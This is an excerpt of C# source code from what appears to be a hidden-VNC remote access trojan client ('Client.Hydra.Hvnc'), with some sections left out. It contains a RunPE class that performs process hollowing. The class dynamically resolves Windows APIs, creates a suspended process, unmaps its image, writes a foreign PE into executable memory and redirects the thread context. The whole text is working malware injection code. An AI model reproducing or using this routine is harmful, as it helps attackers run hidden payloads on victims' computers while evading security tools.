...
namespace Client.Hydra.Hvnc
{
	...
	internal sealed class RunPE
	{
		...
		private static readonly DelegateResumeThread ResumeThread = RunPE.LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");

		private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = RunPE.LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");

		private static readonly DelegateSetThreadContext SetThreadContext = RunPE.LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");

		private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = RunPE.LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");

		private static readonly DelegateGetThreadContext GetThreadContext = RunPE.LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");

		private static readonly DelegateVirtualAllocEx VirtualAllocEx = RunPE.LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");

		private static readonly DelegateWriteProcessMemory WriteProcessMemory = RunPE.LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");

		private static readonly DelegateReadProcessMemory ReadProcessMemory = RunPE.LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");

		private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = RunPE.LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");

		public static readonly DelegateCreateProcessA CreateProcessA = RunPE.LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");

		public static void Run3(byte[] data)
		{
			try
			{
				Thread thread = new Thread(new ParameterizedThreadStart(Run4));
		...
		public static int TryRun(string path, string cmd, byte[] data, bool compatible, bool hidden, string Desktop = "", int PID = 0)
		{
			try
			{
				...
				do
				{
					if (!RunPE.HandleRun(path, cmd, data, compatible, hidden, Desktop, PID))
					{
						num++;
						continue;
					}
		...
		private static bool HandleRun(string path, string cmd, byte[] data, bool compatible, bool hidden = false, string Desktop = "", int PID = 0)
		{
			...
			try
			{
				...
				if (!RunPE.CreateProcessA(path, text, intPtr, intPtr, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
				{
					throw new Exception();
				}
				...
				if (IntPtr.Size == 4)
				{
					if (!RunPE.GetThreadContext(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!RunPE.Wow64GetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int buffer = 0;
				int bytesRead = 0;
				if (!RunPE.ReadProcessMemory(processInformation.ProcessHandle, num3 + 8, ref buffer, 4, ref bytesRead))
				{
					throw new Exception();
				}
				if (num2 == buffer && RunPE.ZwUnmapViewOfSection(processInformation.ProcessHandle, buffer) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(data, num + 80);
				int bufferSize = BitConverter.ToInt32(data, num + 84);
				int num4 = RunPE.VirtualAllocEx(processInformation.ProcessHandle, num2, length, 12288, 64);
				bool flag = false;
				if (!compatible && num4 == 0)
				{
					flag = true;
					num4 = RunPE.VirtualAllocEx(processInformation.ProcessHandle, 0, length, 12288, 64);
				}
				if (num4 == 0)
				{
					throw new Exception();
				}
				if (!RunPE.WriteProcessMemory(processInformation.ProcessHandle, num4, data, bufferSize, ref bytesRead))
				{
					throw new Exception();
				}
				int num5 = num + 248;
				...
				for (int i = 0; i <= num6; i++)
				{
					...
					if (num8 != 0)
					{
						...
						if (!RunPE.WriteProcessMemory(processInformation.ProcessHandle, num4 + num7, array2, array2.Length, ref bytesRead))
						{
							throw new Exception();
						}
					}
				...
				if (!RunPE.WriteProcessMemory(processInformation.ProcessHandle, num3 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				...
				if (IntPtr.Size == 4)
				{
					if (!RunPE.SetThreadContext(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!RunPE.Wow64SetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
